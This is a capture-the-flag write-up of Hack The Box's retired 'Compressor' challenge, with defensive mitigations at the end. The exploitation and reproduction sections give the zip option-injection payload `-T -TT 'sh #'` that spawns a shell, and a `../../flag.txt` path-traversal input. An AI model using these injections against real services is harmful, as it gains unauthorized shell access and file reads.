---
challenge: Compressor
type: Misc
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [misc, command-injection, gtfobins, zip, restricted-shell]
---

# Compressor — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flag.

## TL;DR

A menu interface creates files and compresses them with `zip`. Command options are passed unfiltered; the GTFOBins trick `-T -TT 'sh #'` turns `zip` into a shell. From there, the flag is read outside the working directory.

## Statement and surface

- Misc, Very Easy, retired.
- A remote TCP instance is provided.
- The menu creates, lists, reads, compresses, changes directory and cleans up.

```bash
nc <IP> <PORT>
```

## Reconnaissance

- The menu asks for a component (`Head`, `Torso`, `Hands`, `Legs`) and works in a random directory.
- The compress option runs `zip <name>.zip <name> <options>`.
- The read option runs `cat ./<name>`.
- The user is `ctf`; the target is `flag.txt`, outside the component directory.

## Code analysis

The options string is concatenated into the command without escaping. `zip` can execute a command through its test options (`-T` and `-TT`). The read option is also vulnerable to path traversal and `;` injection.

```bash
# Create an artifact first.
printf 'x' > artifact
zip artifact.zip artifact -T -TT 'sh #'
```

## Why it works

`zip` interprets `-TT <command>` and runs the command to test the archive. If the command is `sh`, an interactive shell is returned. The menu does not validate that options are only compression flags.

## Local reproduction

```bash
mkdir -p /tmp/compressor/Head
cd /tmp/compressor/Head
printf 'x' > artifact
zip artifact.zip artifact -T -TT 'sh #'
```

- The shell opens in the current directory.
- `cd ../..` leaves the component.

## Exploitation

1. Choose a component.
2. Create an artifact with any content.
3. Choose compress.
4. Enter the zip name, the artifact name and `-T -TT 'sh #'`.
5. In the shell, find the flag.

```text
Insert <name>.zip: artifact
Insert <name>: artifact
Insert <options>: -T -TT 'sh #'
```

```bash
cd ../..
ls
cat flag.txt
```

The flag is redacted. The read option also allows `../../flag.txt` when the filter is missing.

## Evidence

- Menu and options entered.
- `whoami` and `pwd` inside the shell.
- Redacted flag.

## Lessons learned

- A menu that builds commands from user input is an injection.
- `zip` has a documented execution primitive in GTFOBins.
- Restricting the binary is not enough when arbitrary options are allowed.

## Mitigations and detection

- Do not pass user-controlled options to `zip`.
- Use an allowlist of options and execute without a shell.
- Wrap compression in a function with normalized paths.
- Alert on `zip` processes with `-TT`, child shells and reads outside the working directory.

## References

- <https://www.hackthebox.com/challenges/Compressor>
- <https://gtfobins.github.io/gtfobins/zip/>
- <https://owasp.org/www-community/attacks/Command_Injection>
- <https://attack.mitre.org/techniques/T1059/004/>
